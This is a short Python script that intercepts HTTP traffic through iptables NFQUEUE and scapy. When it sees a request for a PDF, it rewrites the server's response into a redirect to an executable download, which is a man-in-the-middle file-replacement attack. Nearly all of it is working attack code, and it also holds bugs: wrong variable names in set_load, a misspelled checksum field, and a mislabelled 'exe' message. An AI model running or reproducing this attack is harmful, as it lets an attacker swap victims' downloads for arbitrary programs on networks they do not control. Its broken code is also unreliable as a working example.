#!/usr/bin/env python
# 
#
# sudo iptables -I FORWARD  -j NFQUEUE --queue-num  0
# sudo iptables --flush
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  : to test on loal host
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0  : to test on loal host
# 
# python program to intercept files transffered through http protocol
# this code LICENSE
# dependencies
# requirement
# more author and github 
# copyright
# 				code contributed by: @nibrasmuhamed and @muhammednahil on Github


import netfilterqueue
import scapy.all as scapy
import os

def main():

	ack_list = []

	os.system("iptables --flush")
	os.system("iptables -I FORWARD  -j NFQUEUE --queue-num  0")
	os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")

	def set_load(packet, load):
		packet[scapy.Raw].load = load
		del scapy_packet[scapy.IP].len
		del scapy_packet[scapy.IP].chksum
		del scapy_packet[scapy.TCP].chksums
		return packet

	def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
			if scapy_packet[scapy.TCP].dport == 80:
				if ".pdf" in scapy_packet[scapy.Raw].load:
					print("[+] exe Download request found")
					ack_list.append(scapy_packet[scapy.TCP].ack)

			elif scapy_packet[scapy.TCP].sport == 80:
				if scapy_packet[scapy.TCP].seq in ack_list:
					ack_list.remove(scapy_packet[scapy.TCP].seq)
					print("[+] Replacing the file")
					modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-61b1.exe\n\n")				
					packet.set_payload(str(modified_packet))

		packet.accept()

	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()

if __name__ == "__main__":
   main()